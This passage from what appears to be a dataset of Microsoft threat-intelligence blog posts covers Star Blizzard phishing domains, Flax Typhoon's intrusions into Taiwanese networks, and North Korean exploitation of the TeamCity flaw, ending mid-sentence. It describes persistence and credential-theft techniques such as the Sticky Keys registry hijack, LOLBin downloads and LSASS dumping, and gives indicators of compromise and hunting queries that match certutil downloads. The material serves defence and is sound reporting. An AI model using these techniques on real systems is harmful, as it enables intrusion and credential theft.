13:21:33 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | andysalesproject[.]com | 2023/08/28 13:21:34 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | pandawithrainbow[.]com | 2023/08/28 17:08:58 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | natalyincity[.]com | 2023/08/29 15:25:02 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | machinerelise[.]com | 2023/09/01 16:29:09 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | industrialcorptruncate[.]com | 2023/09/01 16:30:07 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | constructionholdingnewlife[.]com | 2023/09/07 14:00:55 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | adventuresrebornpanda[.]com | 2023/09/07 14:00:55 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | cryingpand[.]com | 2023/09/13 13:10:40 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | industrialwatership[.]com | 2023/09/13 13:10:41 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | olohaisland[.]com | 2023/09/13 14:25:35 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | voodoomagician[.]com | 2023/09/13 14:25:36 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | newestchairs[.]com | 2023/09/14 11:24:47 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | cpuisocutter[.]com | 2023/09/14 12:37:53 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | incorpcpu[.]com | 2023/09/14 12:37:57 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | gulperfish[.]com | 2023/09/14 14:00:25 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | leviathanfish[.]com | 2023/09/14 14:00:25 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | truncationcorp[.]com | 2023/09/14 14:05:41 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | gzipinteraction[.]com | 2023/09/14 14:05:42 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | ghostshowing[.]com | 2023/09/14 16:10:42 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | hallowenwitch[.]com | 2023/09/14 16:10:43 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | certificatentrance[.]com | 2023/09/19 08:18:39 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | apiwebdata[.]com | 2023/10/02 14:59:14 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | apidatahook[.]com | 2023/10/04 15:45:19 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | apireflection[.]com | 2023/10/04 15:45:25 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | protectionoffice[.]tech | 2023/10/05 11:33:46 | Hostinger UAB | C=US, O=Let’s Encrypt, CN=R3 | | | lazyprotype[.]com | 2023/10/11 11:52:18 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | angelicfish[.]com | 2023/10/13 17:57:29 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | globalyfish[.]com | 2023/10/13 17:57:31 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | medicprognosis[.]com | 2023/10/16 14:36:32 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | medicoutpatient[.]com | 2023/10/16 14:36:41 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | krakfish[.]com | 2023/10/17 17:09:29 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | stingrayfish[.]com | 2023/10/17 17:09:31 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | incorpreview[.]com | 2023/10/17 18:27:09 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | truncatetrim[.]com | 2023/10/17 18:27:11 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | corporatesinvitation[.]com | 2023/10/18 14:48:54 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | triminget[.]com | 2023/10/18 17:31:40 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | firewitches[.]com | 2023/10/19 10:40:51 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | solartemplar[.]com | 2023/10/19 10:40:52 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | encryptionrenewal[.]com | 2023/10/20 13:36:24 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | sslkeycert[.]com | 2023/10/20 13:36:24 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | barbarictruths[.]com | 2023/10/23 07:37:30 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | castlefranks[.]com | 2023/10/23 07:37:33 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Yes | | comintroduction[.]com | 2023/10/24 14:01:11 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | | | corpviewer[.]com | 2023/10/31 13:10:38 | NameCheap, Inc | C=US, O=Let’s Encrypt, CN=R3 | Star Blizzard HubSpot campaign domains: - djs53104[.]eu1[.]hubspotlinksfree[.]com – used in August 2023 - djr6t104[.]eu1[.]hubspotlinksfree[.]com – used in August 2023 - djrzf704[.]eu1[.]hubspotlinksfree[.]com – used in August 2023 - djskzh04[.]eu1[.]hubspotlinksfree[.]com – used in August 2023 - djslws04[.]eu1[.]hubspotlinksfree[.]com – used in August 2023 - djs36c04[.]eu1[.]hubspotlinksfree[.]com – used in August 2023 - djt47x04[.]eu1[.]hubspotlinksfree[.]com – used in September 2023 - djvcl404[.]eu1[.]hubspotlinksfree[.]com – used in October 2023 - d5b74r04[.]na1[.]hubspotlinksfree[.]com – used in October 2023 - djvxqp04[.]eu1[.]hubspotlinksfree[.]com – used in October 2023 Star Blizzard MailerLite campaign domain: - ydjjja[.]clicks[.]mlsend[.]com – used in September 2023 References - https://citizenlab.ca/2024/08/sophisticated-phishing-targets-russias-perceived-enemies-around-the-globe/ - https://www.ncsc.gov.uk/news/spear-phishing-campaigns-targets-of-interest - https://www.recordedfuture.com/bluecharlie-previously-tracked-as-tag-53-continues-to-deploy-new-infrastructure-in-2023 Further reading For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on X (formerly Twitter) at https://twitter.com/MsftSecIntel.\nTo hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast: https://thecyberwire.com/podcasts/microsoft-threat-intelligence.","num_sentences":146,"metadata":{"source":"blog","platform":"Microsoft","filename":"star-blizzard"}}
{"id":66,"title":"Flax Typhoon using legitimate software to quietly access Taiwanese organizations | Microsoft Security Blog","publish_date":null,"link":"https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/","clean_text":"Summary Microsoft has identified a nation-state activity group tracked as Flax Typhoon, based in China, that is targeting dozens of organizations in Taiwan with the likely intention of performing espionage.\nFlax Typhoon gains and maintains long-term access to Taiwanese organizations’ networks with minimal use of malware, relying on tools built into the operating system, along with some normally benign software to quietly remain in these networks.\nMicrosoft has not observed Flax Typhoon using this access to conduct additional actions.\nThis blog aims to raise awareness of the techniques used by this threat actor and inform better defenses to protect against future attacks.\nMicrosoft has observed a distinctive pattern of malicious activity almost exclusively affecting organizations in Taiwan using techniques that could be easily reused in other operations outside the region and would benefit from broader industry visibility.\nMicrosoft attributes this campaign to Flax Typhoon (overlaps with ETHEREAL PANDA), a nation-state actor based out of China.\nFlax Typhoon’s observed behavior suggests that the threat actor intends to perform espionage and maintain access to organizations across a broad range of industries for as long as possible.\nHowever, Microsoft has not observed Flax Typhoon act on final objectives in this campaign.\nMicrosoft is choosing to highlight this Flax Typhoon activity at this time because of our significant concern around the potential for further impact to our customers.\nAlthough our visibility into these threats has given us the ability to deploy detections to our customers, the lack of visibility into other parts of the actor’s activity compelled us to drive broader community awareness to further investigations and protections across the security ecosystem.\nIn this blog post, we share information on Flax Typhoon, the current campaign targeting Taiwan, and the actor’s tactics for achieving and maintaining unauthorized access to target networks.\nBecause this activity relies on valid accounts and living-off-the-land binaries (LOLBins), detecting and mitigating this attack could be challenging.\nCompromised accounts must be closed or changed.\nCompromised systems must be isolated and investigated.\nAt the end of this blog post, we share more mitigation steps and best practices, as well as provide details on how Microsoft 365 Defender detects malicious and suspicious activity to protect organizations from such stealthy attacks.\nWho is Flax Typhoon?\nFlax Typhoon has been active since mid-2021 and has targeted government agencies and education, critical manufacturing, and information technology organizations in Taiwan.\nSome victims have also been observed elsewhere in Southeast Asia, as well as in North America and Africa.\nFlax Typhoon focuses on persistence, lateral movement, and credential access.\nAs with any observed nation-state actor activity, Microsoft has directly notified targeted or compromised customers, providing them with important information needed to secure their environments.\nFlax Typhoon is known to use the China Chopper web shell, Metasploit, Juicy Potato privilege escalation tool, Mimikatz, and SoftEther virtual private network (VPN) client.\nHowever, Flax Typhoon primarily relies on living-off-the-land techniques and hands-on-keyboard activity.\nFlax Typhoon achieves initial access by exploiting known vulnerabilities in public-facing servers and deploying web shells like China Chopper.\nFollowing initial access, Flax Typhoon uses command-line tools to first establish persistent access over the remote desktop protocol, then deploy a VPN connection to actor-controlled network infrastructure, and finally collect credentials from compromised systems.\nFlax Typhoon further uses this VPN access to scan for vulnerabilities on targeted systems and organizations from the compromised systems.\nAnalysis of current campaign Initial access Flax Typhoon achieves initial access by exploiting known vulnerabilities in public-facing servers.\nThe services targeted vary, but include VPN, web, Java, and SQL applications.\nThe payload in these exploits is a web shell, such as China Chopper, which allows for remote code execution on the compromised server.\nPrivilege escalation In cases where the process compromised via web shell does not have local administrator privileges, Flax Typhoon downloads and runs a piece of malware that exploits one or more known vulnerabilities to obtain local system privileges.\nMicrosoft has observed the actor use Juicy Potato, BadPotato, and other open-source tools to exploit these vulnerabilities.\nPersistence Once Flax Typhoon can access Windows Management Instrumentation command-line (WMIC), PowerShell, or the Windows Terminal with local administrator privileges, the actor establishes a long-term method of accessing the compromised system using the remote desktop protocol (RDP).\nTo accomplish this, the actor disables network-level authentication (NLA) for RDP, replaces the Sticky Keys binary, and establishes a VPN connection.\nWhen using RDP, NLA requires the connecting user to authenticate to the remote system before a full remote session is established and the Windows sign-in screen is displayed.\nWhen NLA is disabled, any user attempting to access the remote system can interact with the Windows sign-in screen before authenticating, which can expose the remote system to malicious actions by the connecting user.\nFlax Typhoon changes a registry key to disable NLA, allowing them to access the Windows sign-in screen without authenticating, whereupon the actor will use the Sticky Keys shortcut.\nSticky Keys is an accessibility feature in Windows that allows users to press modifier keys (such as Shift, Ctrl, Alt) one at a time instead of simultaneously.\nIt includes a shortcut where the user can press the Shift key five times in succession to launch sethc.exe, the program that manages Sticky Keys.\nThe user can invoke this shortcut at any time, including at the sign-in screen.\nTo take advantage of this feature, Flax Typhoon changes a registry key that specifies the location of sethc.exe.\nThe actor adds arguments that cause the Windows Task Manager to be launched as a debugger for sethc.exe.\nAs a result, when the actor uses the Sticky Keys shortcut on the Windows sign-in screen, Task Manager launches with local system privileges.\nAt this stage, Flax Typhoon can access the compromised system via RDP, use the Sticky Keys shortcut at the sign-in screen, and access Task Manager with local system privileges.\nFrom there, the actor can launch the Terminal, create memory dumps, and take nearly any other action on the compromised system.\nThe only issue the actor faces with this persistence method is that RDP is most likely running on an internal-facing network interface.\nFlax Typhoon’s solution is to install a legitimate VPN bridge to automatically connect to actor-controlled network infrastructure.\nCommand and control To deploy the VPN connection, Flax Typhoon downloads an executable file for SoftEther VPN from their network infrastructure.\nThe actor downloads the tool using one of several LOLBins, such as the PowerShell Invoke-WebRequest utility, certutil, or bitsadmin.\nFlax Typhoon then uses the Service Control Manager (SCM) to create a Windows service that launches the VPN connection automatically when the system starts.\nThis could allow the actor to monitor the availability of the compromised system and establish an RDP connection.\nFlax Typhoon takes several precautions with their VPN connection to make it harder to identify.\nFirst, the actor uses a legitimate VPN application that could be found in enterprise environments.\nAs a result, the file itself is almost certain to go undetected by antivirus products.\nSecond, the actor almost always renames the executable file from vpnbridge.exe to conhost.exe or dllhost.exe.\nThese names imitate the legitimate Windows components Console Window Host Process and Component Object Model Surrogate respectively.\nThird, the actor uses SoftEther’s VPN-over-HTTPS operation mode, which uses protocol tunneling to encapsulate Ethernet packets into compliant HTTPS packets and transmit them to TCP port 443.\nThis makes the VPN connection very difficult to differentiate from legitimate HTTPS traffic, which most network security appliances would not block.\nIn cases where Flax Typhoon needs to move laterally to access other systems on the compromised network, the actor uses LOLBins, including Windows Remote Management (WinRM) and WMIC.\nMicrosoft has observed Flax Typhoon routing network traffic to other targeted systems through the SoftEther VPN bridge installed on compromised systems.\nThis network traffic includes network scanning, vulnerability scanning, and exploitation attempts.\nCredential access Once Flax Typhoon becomes established on the target system, Microsoft observes the actor conducting credential access activities using common tools and techniques.\nMost commonly, Flax Typhoon targets the Local Security Authority Subsystem Service (LSASS) process memory and Security Account Manager (SAM) registry hive.\nBoth stores contain hashed passwords for users signed into the local system.\nFlax Typhoon frequently deploys Mimikatz, a publicly available malware that can automatically dump these stores when improperly secured.\nThe resulting password hashes can be cracked offline or used in pass-the-hash (PtH) attacks to access other resources on the compromised network.\nFlax Typhoon also enumerates restore points used by System Restore.\nRestore points contain data about the Windows operating system that the system owner can use to revert changes to the system if it becomes inoperable, rather than a backup of user data.\nFlax Typhoon could use this information to better understand the compromised system or as a template for removing indicators of malicious activity.\nThis pattern of activity is unusual in that minimal activity occurs after the actor establishes persistence.\nFlax Typhoon’s discovery and credential access activities do not appear to enable further data-collection and exfiltration objectives.\nWhile the actor’s observed behavior suggests Flax Typhoon intents to perform espionage and maintain their network footholds, Microsoft has not observed Flax Typhoon act on final objectives in this campaign.\nMitigation and protection guidance Defending against techniques used by Flax Typhoon begins with vulnerability and patch management, particularly on systems and services exposed to the public internet.\nThe credential access techniques used can also be mitigated with proper system hardening.\nWhat to do now if you’re affected Affected organizations need to assess the scale of Flax Typhoon activity in their network, remove malicious tools and C2 infrastructure, and check logs for signs of compromised accounts that may have been used for malicious purposes.\nInvestigating Suspected compromised accounts or affected systems - Find LSASS and SAM dumping to identify affected accounts. -\nExamine the activity of compromised accounts for any malicious actions or exposed data. -\nClose or change credentials for all compromised accounts.\nDepending on the level of activity, many accounts may be affected. -\nAffected systems should be isolated and forensically examined for artifacts of malicious activity. -\nBecause Flax Typhoon alters the configuration of the operating system to produce malicious behavior, affected systems may need to be decommissioned or restored to a known-good configuration.\nDefending against Flax Typhoon attacks - Keep public-facing servers up to date to defend against malicious activity.\nAs prime targets for threat actors, public-facing servers need additional monitoring and security.\nUser input validation, file integrity monitoring, behavioral monitoring, and web application firewalls can all help to better secure these servers. -\nMonitor the Windows registry for unauthorized changes.\nThe Audit Registry feature allows administrators to generate events when specific registry keys are modified.\nSuch policies can detect registry changes that undermine the security of a system, like those made by Flax Typhoon. -\nUse network monitoring and intrusion detection systems to identify unusual or unauthorized network traffic.\nIf an organization does not use RDP for a specific business purpose, any RDP traffic should be considered unauthorized and generate alerts. -\nEnsure that Windows systems are kept updated with the latest security patches, including MS16-075. -\nMitigate the risk of compromised valid accounts by enforcing strong multifactor authentication (MFA) policies using hardware security keys or Microsoft Authenticator.\nPasswordless sign-in methods (for example, Windows Hello, FIDO2 security keys, or Microsoft Authenticator), password expiration rules, and deactivating unused accounts can also help mitigate risk from this access method. -\nRandomize Local Administrator passwords with a tool like Local Administrator Password Solution (LAPS) to prevent lateral movement using local accounts with shared passwords. -\nReduce the attack surface.\nMicrosoft customers can turn on the following attack surface reduction rules to block or audit some observed activity associated with this threat: - Block credential stealing from the Windows local security authority subsystem (lsass.exe). -\nBlock process creations originating from PSExec and WMI commands.\nSome organizations may experience compatibility issues with this rule on certain server systems but should deploy it to other systems to prevent lateral movement originating from PsExec and WMI. -\nHarden the LSASS process by enabling Protective Process Light (PPL) for LSASS on Windows 11 devices.\nNew, enterprise-joined Windows 11 (22H2 update) installs have this feature enabled by default.\nIn addition, enable Windows Defender Credential Guard, which is also turned on by default for organizations using the Enterprise edition of Windows 11, as well as Memory integrity (also referred to as hypervisor-protected code integrity or HVCI) for stronger protections on Windows. -\nSet the WDigest UseLogonCredential registry value via Group Policy Object to reduce the risk of successful LSASS process memory dumping. -\nTurn on cloud-delivered protection in Microsoft Defender Antivirus to cover rapidly evolving attacker tools, techniques, and behaviors such as those exhibited by Flax Typhoon. -\nRun endpoint detection and response (EDR) in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus does not detect the threat, or when Microsoft Defender Antivirus is running in passive mode.\nEDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-compromise.\nDetection details and hunting queries Microsoft 365 Defender detections Microsoft 365 Defender is becoming Microsoft Defender XDR.\nLearn more.\nMicrosoft Defender Antivirus Microsoft Defender Antivirus detects threat components as the following malware: - HackTool:Win32/Mimikatz - Trojan:Win32/Swrort - HackTool:Win32/Badcastle - Behavior:Win32/CobaltStrike - Backdoor:ASP/Chopper Microsoft Defender for Endpoint The following alerts might indicate threat activity related to this threat.\nNote, however, that these alerts can also be triggered by unrelated threat activity. -\nMalicious credential theft tool execution detected - Suspicious access to LSASS service - Use of LOLBin to run malicious code - System file masquerade Hunting queries Microsoft 365 Defender Microsoft 365 Defender customers can run the following queries to find related activity in their networks: Network activity with Flax Typhoon network infrastructure let ipAddressTimes = datatable(ip: string, startDate: datetime, endDate: datetime) [ \"101.33.205.106\", datetime(\"2022-11-07\"), datetime(\"2022-11-08\"), \"39.98.208.61\", datetime(\"2023-07-28\"), datetime(\"2023-08-12\"), \"45.195.149.224\", datetime(\"2023-01-04\"), datetime(\"2023-03-29\"), \"122.10.89.230\", datetime(\"2023-01-12\"), datetime(\"2023-01-13\"), \"45.204.1.248\", datetime(\"2023-02-23\"), datetime(\"2023-05-09\"), \"45.204.1.247\", datetime(\"2023-07-24\"), datetime(\"2023-08-10\"), \"45.88.192.118\", datetime(\"2022-11-07\"), datetime(\"2022-11-08\"), \"154.19.187.92\", datetime(\"2022-12-01\"), datetime(\"2022-12-02\"), \"134.122.188.20\", datetime(\"2023-06-13\"), datetime(\"2023-06-20\"), \"104.238.149.146\", datetime(\"2023-07-13\"), datetime(\"2023-07-14\"), \"139.180.158.51\", datetime(\"2022-08-30\"), datetime(\"2023-07-27\"), \"137.220.36.87\", datetime(\"2023-02-23\"), datetime(\"2023-08-04\"), \"192.253.235.107\", datetime(\"2023-06-06\"), datetime(\"2023-06-07\") ]; let RemoteIPFiltered = DeviceNetworkEvents | join kind=inner (ipAddressTimes) on $left.\nRemoteIP == $right.ip | where Timestamp between (startDate .. endDate); let LocalIPFiltered = DeviceNetworkEvents | join kind=inner (ipAddressTimes) on $left.\nLocalIP == $right.ip | where Timestamp between (startDate .. endDate); union RemoteIPFiltered, LocalIPFiltered SoftEther VPN bridge launched by SQL Server process DeviceProcessEvents | where ProcessVersionInfoOriginalFileName == \"vpnbridge.exe\" or ProcessVersionInfoFileDescription == \"SoftEther VPN\" | where InitiatingProcessParentFileName == \"sqlservr.exe\" SoftEther VPN bridge renamed to “conhost.exe” or “dllhost.exe” DeviceProcessEvents | where ProcessVersionInfoOriginalFileName == \"vpnbridge.exe\" or ProcessVersionInfoFileDescription == \"SoftEther VPN\" | where ProcessCommandLine has_any (\"conhost.exe\", \"dllhost.exe\") or FolderPath has_any (\"mssql\", \"conhost.exe\", \"dllhost.exe\") Certutil launched by SQL Server process DeviceProcessEvents | where ProcessCommandLine has_all (\"certutil\", \"-urlcache\") | where InitiatingProcessFileName has_any (\"sqlservr.exe\", \"sqlagent.exe\", \"sqlps.exe\", \"launchpad.exe\", \"sqldumper.exe\") File downloaded by MSSQLSERVER account using certutil DeviceFileEvents | where InitiatingProcessAccountName == \"MSSQLSERVER\" | where InitiatingProcessFileName == \"certutil.exe\" File renamed to “conhost.exe” or “dllhost.exe”, downloaded using certutil DeviceFileEvents | where InitiatingProcessFileName == \"certutil.exe\" | where FileName in (\"conhost.exe\", \"dllhost.exe\") Network connection made by SoftEther VPN bridge renamed to “conhost.exe” or “dllhost.exe” DeviceNetworkEvents | where InitiatingProcessVersionInfoOriginalFileName == \"vpnbridge.exe\" or InitiatingProcessVersionInfoProductName == \"SoftEther VPN\" | where InitiatingProcessFileName == \"conhost.exe\" Network connection made by MSSQLSERVER account, using SoftEther VPN bridge DeviceNetworkEvents | where InitiatingProcessVersionInfoOriginalFileName == \"vpnbridge.exe\" or InitiatingProcessVersionInfoProductName == \"SoftEther VPN\" | where InitiatingProcessAccountName == \"MSSQLSERVER\" Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace.\nIf the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.\nMore details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy.\nMicrosoft Sentinel also has a range of detection and threat hunting content that customers can use to detect the post exploitation activity detailed in this blog in addition to Microsoft 365 Defender detections list above. -\nPossible web shell drop - Web shell activity - Potential local privilege escalation - Anomalous RDP activity - Accessibility features modification - Certutil-LOLBins - Bitsadmin activity - Suspected LSASS dump - Credential dumping service installation Indicators of compromise In addition to compromised SOHO devices and compromised devices used for traffic proxying, Flax Typhoon maintains actor-controlled network infrastructure, including virtual private servers (VPS).\nOver the course of the campaign, the IP addresses listed in the table below were used during the corresponding timeframes.\n| IP address | First seen | Last seen | Description | | 101.33.205[.]106 | 2022-11-07 | 2022-11-07 | Flax Typhoon network infrastructure | | 39.98.208[.]61 | 2023-07-28 | 2023-08-11 | Flax Typhoon network infrastructure | | 45.195.149[.]224 | 2023-01-04 | 2023-03-28 | Flax Typhoon network infrastructure | | 122.10.89[.]230 | 2023-01-12 | 2023-01-12 | Flax Typhoon network infrastructure | | 45.204.1[.]248 | 2023-02-23 | 2023-05-09 | Flax Typhoon network infrastructure | | 45.204.1[.]247 | 2023-07-24 | 2023-08-09 | Flax Typhoon network infrastructure | | 45.88.192[.]118 | 2022-11-07 | 2022-11-07 | Flax Typhoon network infrastructure | | 154.19.187[.]92 | 2022-12-01 | 2022-12-01 | Flax Typhoon network infrastructure | | 134.122.188[.]20 | 2023-06-13 | 2023-06-19 | Flax Typhoon network infrastructure | | 104.238.149[.]146 | 2023-07-13 | 2023-07-13 | Flax Typhoon network infrastructure | | 139.180.158[.]51 | 2022-08-30 | 2023-07-26 | Flax Typhoon network infrastructure | | 192.253.235[.]107 | 2023-06-06 | 2023-06-06 | Flax Typhoon network infrastructure | Flax Typhoon hosts its SofEther VPN servers on its own network infrastructure.\nBecause the servers use the HTTPS protocol to disguise network traffic, they must present TLS certificates.\nFlax Typhoon used the certificates listed in the table below on these VPN servers.\n| SHA-1 TLS fingerprint | Common name (CN) | | 7992c0a816246b287d991c4ecf68f2d32e4bca18 | vpn437972693.sednc[.]cn | | 5437d0195c31bf7cedc9d90b8cb0074272bc55df | asljkdqhkhasdq.softether[.]net | | cc1f0cdc131dfafd43f60ff0e6a6089cd03e92f1 | vpn472462384.softether[.]net | | 2c95b971aa47dc4d94a3c52db74a3de11d9ba658 | softether | References - https://attack.mitre.org/techniques/T1190 - https://attack.mitre.org/techniques/T1505/003/ - https://attack.mitre.org/software/S0020/ - https://github.com/ohpe/juicy-potato - https://github.com/BeichenDream/BadPotato - https://attack.mitre.org/techniques/T1059 - https://attack.mitre.org/techniques/T1546/008/ - https://attack.mitre.org/techniques/T1105/ - https://github.com/SoftEtherVPN/SoftEtherVPN_Stable - https://attack.mitre.org/techniques/T1543/003 - https://attack.mitre.org/techniques/T1036/005/ - https://github.com/SoftEtherVPN/SoftEtherVPN_Stable/blob/master/WARNING.TXT - https://attack.mitre.org/techniques/T1572/ - https://attack.mitre.org/techniques/T1003/001/ - https://attack.mitre.org/techniques/T1003/002/ - https://attack.mitre.org/techniques/T1550/002/ Further reading For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us at https://twitter.com/MsftSecIntel.","num_sentences":119,"metadata":{"source":"blog","platform":"Microsoft","filename":"taiwanese"}}
{"id":67,"title":"Multiple North Korean threat actors exploiting the TeamCity CVE-2023-42793 vulnerability | Microsoft Security Blog","publish_date":"2023-10-28","link":"https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/","clean_text":"Since early October 2023, Microsoft has observed two North Korean nation-state threat actors – Diamond Sleet and Onyx Sleet – exploiting CVE-2023-42793, a remote-code execution vulnerability affecting multiple versions of JetBrains TeamCity server.\nTeamCity is a continuous integration/continuous deployment (CI/CD) application used by organizations for DevOps and other software development activities.\nONYX SLEET In past operations, Diamond Sleet and other North Korean threat actors have successfully carried out software supply chain attacks by infiltrating build environments.\nGiven this, Microsoft assesses that this activity poses a particularly high risk to organizations who are affected.\nJetBrains has released an update to address this vulnerability and has developed a mitigation for users who are unable to update to the latest software version.\nDIAMOND SLEET While the two threat actors are exploiting the same vulnerability, Microsoft observed Diamond Sleet and Onyx Sleet utilizing unique sets of tools and techniques following successful exploitation.\nBased on the profile of victim organizations affected by these intrusions, Microsoft assesses that the threat actors may be opportunistically compromising vulnerable servers.\nHowever, both actors have deployed malware and tools and utilized techniques that may enable persistent access to victim environments.\nSLEET ACTORS As with any observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised and provides them with the information they need to secure their environments.\nWho are Diamond Sleet and Onyx Sleet?\nDiamond Sleet (ZINC) is a North Korean nation-state threat actor that prioritizes espionage, data theft, financial gain, and network destruction.\nThe actor typically targets media, IT services, and defense-related entities around the world.\nMicrosoft reported on Diamond Sleet’s targeting of security researchers in January 2021 and the actor’s weaponizing of open-source software in September 2022.\nIn August 2023, Diamond Sleet conducted a software supply chain compromise of a German software provider.\nOnyx Sleet (PLUTONIUM) is a North Korean nation-state threat actor that primarily targets defense and IT services organizations in South Korea, the United States, and India.\nOnyx Sleet employs a robust set of tools that they have developed to establish persistent access to victim environments and remain undetected.\nThe actor frequently exploits N-day vulnerabilities as a means of gaining initial access to targeted organizations.\nDiamond Sleet attack path 1: Deployment of ForestTiger backdoor Following the successful compromise of TeamCity servers, Diamond Sleet utilizes PowerShell to download two payloads from legitimate infrastructure previously compromised by the threat actor.\nThese two payloads, Forest64.exe and 4800-84DC-063A6A41C5C are stored in the C:ProgramData directory.\nWhen launched, Forest64.exe checks for the presence of the file named 4800-84DC-063A6A41C5C, then reads and decrypts the contents of that file using embedded, statically assigned key of ‘uTYNkfKxHiZrx3KJ’: c:ProgramDataForest64.exe uTYNkfKxHiZrx3KJ Interestingly, this same value is specified as a parameter when the malware is invoked, but we did not see it utilized during our analysis.\nThe same value and configuration name was also referenced in historical activity reported by Kaspersky’s Securelist on this malware, dubbed ForestTiger.\nThe decrypted content of 4800-84DC-063A6A41C5C is the configuration file for the malware, which contains additional parameters, such as the infrastructure used by the backdoor for command and control (C2).\nMicrosoft observed Diamond Sleet using infrastructure previously compromised by the actor for C2.\nMicrosoft observed Forest64.exe then creating a scheduled task named Windows TeamCity Settings User Interface so it runs every time the system starts with the above referenced command parameter “uTYNkfKxHiZrx3KJ”.\nMicrosoft also observed Diamond Sleet leveraging the ForestTiger backdoor to dump credentials via the LSASS memory.\nMicrosoft Defender Antivirus detects this malware as ForestTiger.\nDiamond Sleet attack path 2: Deploying payloads for use in DLL search-order hijacking attacks Diamond Sleet leverages PowerShell on compromised servers to download a malicious DLL from attacker infrastructure.\nThis malicious DLL is then staged in C:ProgramData alongside a legitimate .exe file to carry out DLL search-order hijacking.\nMicrosoft has observed these malicious DLL and legitimate EXE combinations used by the actor: | Malicious DLL name | Legitimate binary name | |---|---| | DSROLE.dll | wsmprovhost.exe | | Version.dll | clip.exe | DSROLE.dll attack chain When DSROLE.dll is loaded by wsmprovhost.exe, the DLL initiates a thread that enumerates and attempts to process files that exist in the same executing directory as the DLL.\nThe first four bytes of candidate files are read and signify the size of the remaining buffer to read.\nOnce the remaining data is read back, the bytes are reversed to reveal an executable payload that is staged in memory.\nThe expected PE file should be a DLL with the specific export named ‘StartAction’.\nThe address of this export is resolved and then launched in memory.\nWhile the functionality of DSROLE.dll is ultimately decided by whatever payloads it deobfuscates and launches, Microsoft has observed the DLL being used to launch wksprt.exe, which communicates with C2 domains.\nMicrosoft Defender Antivirus detects DSROLE.dll using the family name RollSling.\nVersion.dll attack chain When loaded by clip.exe, Version.dll loads and decrypts the contents of readme.md, a file downloaded alongside Version.dll from attacker-compromised infrastructure.\nThe file readme.md contains data that is used as a multibyte XOR key to decrypt position-independent code (PIC) embedded in Version.dll.\nThis PIC loads and launches the final-stage remote access trojan (RAT).\nOnce loaded in memory, the second-stage executable decrypts an embedded configuration file containing several URLs used by the malware for command and control.\nShortly after the malware beacons to the callback URL, Microsoft has observed a separate process iexpress.exe created and communicating with other C2 domains.\nMicrosoft Defender Antivirus detects Version.dll using the family 